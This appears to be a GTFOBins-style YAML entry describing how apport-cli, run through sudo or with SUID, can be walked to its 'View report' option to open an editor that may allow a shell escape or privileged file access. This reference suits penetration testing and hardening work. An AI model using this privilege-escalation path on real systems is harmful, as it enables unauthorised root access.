---
description: This can be run with elevated privileges to create a bug report, then view the report in a text editor, which may allow shell escapes and/or privileged file read/writes (Depending upon the default file editor program).
functions:
  shell:
    - code: |
        apport-cli -f

        *** What kind of problem do you want to report?
        <SNIP>
        Please choose (1/2/3/4/5/6/7/8/9/10/C): 1

        *** Collecting problem information
        <SNIP>

        *** What display problem do you observe?
        <SNIP>

        Please choose (1/2/3/4/5/6/7/8/C): 2
        <SNIP>

        *** Send problem report to the developers?
        <SNIP>
        What would you like to do? Your options are:
            <SNIP>
            V: View report
            <SNIP>
        Please choose (S/V/K/I/C): V

        <AT THIS POINT, DEFAULT CLI TEXT EDITOR IS OPENED. FROM HERE, SHELL ESCAPE AND/OR PRIVIEDGED R/W DEPENDS UPON THE EDITOR>
  suid:
    - code: |
        apport-cli -f

        *** What kind of problem do you want to report?
        <SNIP>
        Please choose (1/2/3/4/5/6/7/8/9/10/C): 1

        *** Collecting problem information
        <SNIP>

        *** What display problem do you observe?
        <SNIP>

        Please choose (1/2/3/4/5/6/7/8/C): 2
        <SNIP>

        *** Send problem report to the developers?
        <SNIP>
        What would you like to do? Your options are:
            <SNIP>
            V: View report
            <SNIP>
        Please choose (S/V/K/I/C): V

        <AT THIS POINT, DEFAULT CLI TEXT EDITOR IS OPENED. FROM HERE, SHELL ESCAPE AND/OR PRIVIEDGED R/W DEPENDS UPON THE EDITOR>
  sudo:
    - code: |
        sudo apport-cli -f

        *** What kind of problem do you want to report?
        <SNIP>
        Please choose (1/2/3/4/5/6/7/8/9/10/C): 1

        *** Collecting problem information
        <SNIP>

        *** What display problem do you observe?
        <SNIP>

        Please choose (1/2/3/4/5/6/7/8/C): 2
        <SNIP>

        *** Send problem report to the developers?
        <SNIP>
        What would you like to do? Your options are:
            <SNIP>
            V: View report
            <SNIP>
        Please choose (S/V/K/I/C): V

        <AT THIS POINT, DEFAULT CLI TEXT EDITOR IS OPENED. FROM HERE, SHELL ESCAPE AND/OR PRIVIEDGED R/W DEPENDS UPON THE EDITOR>
---
